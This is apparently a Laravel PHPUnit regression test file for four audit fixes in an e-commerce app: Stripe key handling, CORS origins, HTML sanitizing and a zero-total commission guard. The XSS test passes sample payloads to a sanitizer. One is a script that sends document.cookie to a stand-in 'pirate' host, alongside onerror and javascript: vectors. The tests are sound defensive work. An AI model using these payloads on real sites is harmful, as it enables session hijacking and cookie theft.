<?php

namespace Tests\Feature\Security;

use App\Models\Order;
use App\Models\Vendor;
use App\Services\FinanceCalculator;
use App\Support\HtmlSanitizer;
use Illuminate\Foundation\Testing\RefreshDatabase;
use PHPUnit\Framework\Attributes\Test;
use Tests\TestCase;

/**
 * Regression tests for the four critical findings of the 08/09 audit:
 * the Stripe key read through env() (null once the production build caches the config),
 * the CORS wildcard, the unsanitized vendor HTML, and the division by zero in the
 * commission breakdown.
 */
class CriticalFixesTest extends TestCase
{
    use RefreshDatabase;

    // --- 1. Clé Stripe ------------------------------------------------------

    #[Test]
    public function the_stripe_key_is_read_from_config_not_from_env(): void
    {
        // config() keeps working once `php artisan optimize` caches the config;
        // env() does not, which is what silently broke every Stripe payment.
        config()->set('services.stripe.secret', 'sk_test_exemple');

        $this->assertSame('sk_test_exemple', config('services.stripe.secret'));
    }

    #[Test]
    public function no_application_code_reads_the_stripe_key_through_env(): void
    {
        $files = [
            app_path('Http/Controllers/Api/PaymentController.php'),
            app_path('Livewire/CheckoutPage.php'),
            app_path('Livewire/OrderDetailPage.php'),
            app_path('Livewire/PaiementModal.php'),
            app_path('Livewire/SuccessPage.php'),
            app_path('Livewire/SuccessPageStripe.php'),
        ];

        foreach ($files as $file) {
            $this->assertStringNotContainsString(
                "env('STRIPE_SECRET')",
                file_get_contents($file),
                basename($file) . " lit encore la clé Stripe via env() — elle vaudra null en production."
            );
        }
    }

    // --- 2. CORS -----------------------------------------------------------

    #[Test]
    public function the_cors_policy_has_no_wildcard_origin(): void
    {
        // '*' combined with supports_credentials let any site call the API with a
        // signed-in customer's cookies.
        $this->assertNotContains('*', config('cors.allowed_origins'));
    }

    #[Test]
    public function an_unknown_origin_gets_no_cors_header(): void
    {
        $response = $this->withHeader('Origin', 'https://site-pirate.example')
            ->get('/api/ping');

        $this->assertNull($response->headers->get('Access-Control-Allow-Origin'));
    }

    #[Test]
    public function the_production_origin_is_still_allowed(): void
    {
        $response = $this->withHeader('Origin', 'https://afrobridgeinnov.com')
            ->get('/api/ping');

        $this->assertSame(
            'https://afrobridgeinnov.com',
            $response->headers->get('Access-Control-Allow-Origin')
        );
    }

    #[Test]
    public function a_local_dev_origin_on_any_port_is_allowed(): void
    {
        // The old 'http://localhost:*' string never matched anything; the regex in
        // allowed_origins_patterns does.
        $response = $this->withHeader('Origin', 'http://localhost:5173')
            ->get('/api/ping');

        $this->assertSame(
            'http://localhost:5173',
            $response->headers->get('Access-Control-Allow-Origin')
        );
    }

    // --- 3. XSS ------------------------------------------------------------

    #[Test]
    public function the_sanitizer_strips_every_script_vector(): void
    {
        $clean = HtmlSanitizer::clean(
            '<p onclick="vol()">Promo</p>'
            . '<script>fetch("//pirate/"+document.cookie)</script>'
            . '<img src=x onerror="vol()">'
            . '<a href="javascript:alert(1)">clic</a>'
            . '<iframe src="//pirate"></iframe>'
        );

        $this->assertStringNotContainsString('<script', $clean);
        $this->assertStringNotContainsString('onclick', $clean);
        $this->assertStringNotContainsString('onerror', $clean);
        $this->assertStringNotContainsString('javascript:', $clean);
        $this->assertStringNotContainsString('<iframe', $clean);
    }

    #[Test]
    public function the_sanitizer_keeps_legitimate_formatting_and_relative_images(): void
    {
        // Product images are stored as relative paths under /uploads — dropping them
        // would empty every description in the catalogue.
        $clean = HtmlSanitizer::clean(
            '<p>Tissu <strong>100% coton</strong></p>'
            . '<ul><li>Taille M</li></ul>'
            . '<img src="/uploads/products/x.jpg" alt="photo">'
            . '<a href="/products/abc">voir</a>'
        );

        $this->assertStringContainsString('<strong>100% coton</strong>', $clean);
        $this->assertStringContainsString('<li>Taille M</li>', $clean);
        $this->assertStringContainsString('src="/uploads/products/x.jpg"', $clean);
        $this->assertStringContainsString('href="/products/abc"', $clean);
    }

    #[Test]
    public function the_sanitizer_handles_an_empty_description(): void
    {
        $this->assertSame('', HtmlSanitizer::clean(null));
        $this->assertSame('', HtmlSanitizer::clean(''));
    }

    // --- 4. Division par zéro ----------------------------------------------

    #[Test]
    public function the_commission_breakdown_survives_an_order_totalling_zero(): void
    {
        $order = Order::factory()->create([
            'vendor_id' => Vendor::factory()->create()->id,
            'grand_total' => 0,
        ]);

        $breakdown = (new FinanceCalculator())->calculateOrderBreakdown($order);

        // Same array shape as always: six call sites read these keys to build labels
        // like "0%", so they must stay present and numeric.
        $this->assertSame(0.0, $breakdown['breakdown']['commission_percentage']);
        $this->assertSame(0.0, $breakdown['breakdown']['gateway_fee_percentage']);
        $this->assertSame(0.0, $breakdown['breakdown']['wire_fee_percentage']);
        $this->assertSame(0.0, $breakdown['breakdown']['net_percentage']);
    }

    #[Test]
    public function a_null_total_is_treated_the_same_as_zero(): void
    {
        $order = Order::factory()->create([
            'vendor_id' => Vendor::factory()->create()->id,
            'grand_total' => null,
        ]);

        $breakdown = (new FinanceCalculator())->calculateOrderBreakdown($order);

        $this->assertSame(0.0, $breakdown['breakdown']['net_percentage']);
    }

    #[Test]
    public function a_normal_order_still_gets_real_percentages(): void
    {
        $order = Order::factory()->create([
            'vendor_id' => Vendor::factory()->create()->id,
            'grand_total' => 1000,
        ]);

        $breakdown = (new FinanceCalculator())->calculateOrderBreakdown($order);

        // No commission setting in a fresh test database, so the vendor keeps it all —
        // the point is that the percentage is computed, not zeroed by the guard.
        $this->assertSame(1000.0, (float) $breakdown['gross_amount']);
        $this->assertSame(100.0, $breakdown['breakdown']['net_percentage']);
    }
}
